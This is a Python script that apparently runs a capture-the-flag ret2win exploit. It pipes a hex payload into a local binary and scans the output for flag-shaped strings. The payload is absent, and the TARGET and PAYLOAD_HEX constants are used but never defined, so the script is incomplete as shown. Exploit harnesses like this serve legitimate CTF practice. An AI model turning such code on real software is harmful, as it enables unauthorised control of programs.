"""Standalone local runner for an evidence-derived direct ret2win payload.

Generated constants come from a PWN-FLAG-CHAIN-001 payload-ready finding.
No guessed addresses, offsets or mitigation bypasses are introduced here.
"""
import argparse
import os
import re
import subprocess


def run(binary, payload, timeout):
    """Submit exact payload to a local process and capture bounded output."""
    proc = subprocess.Popen(
        [binary], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    try:
        # Do not add a newline: Ghidra established a byte-oriented write length.
        stdout, _ = proc.communicate(payload, timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        stdout, _ = proc.communicate()
        raise RuntimeError("target timed out; output:\n" + stdout[:8192].decode("utf-8", "replace"))
    return proc.returncode, stdout[:131072]


def main(argv=None):
    parser = argparse.ArgumentParser(description="Local validated-payload ret2win attempt")
    parser.add_argument("binary", nargs="?", default=TARGET)
    parser.add_argument("--timeout", type=float, default=5.0)
    args = parser.parse_args(argv)
    if not os.path.isfile(args.binary):
        parser.error("binary not found: " + args.binary)
    if args.timeout <= 0 or args.timeout > 120:
        parser.error("timeout must be in (0, 120]")
    payload = bytes.fromhex(PAYLOAD_HEX)
    try:
        code, data = run(args.binary, payload, args.timeout)
    except (OSError, RuntimeError) as exc:
        print("EXECUTION ERROR:", exc)
        return 2
    decoded = data.decode("utf-8", "replace")
    print(decoded)
    flags = re.findall(r"[A-Za-z0-9_]+\{[^\s{}]{1,512}\}", decoded)
    for flag in flags:
        print("FLAG CANDIDATE:", flag)
    if flags:
        print("STATUS: flag-pattern-observed (manual validation required)")
        return 0
    print("STATUS: payload-submitted; flag not observed (exit code %s)" % code)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
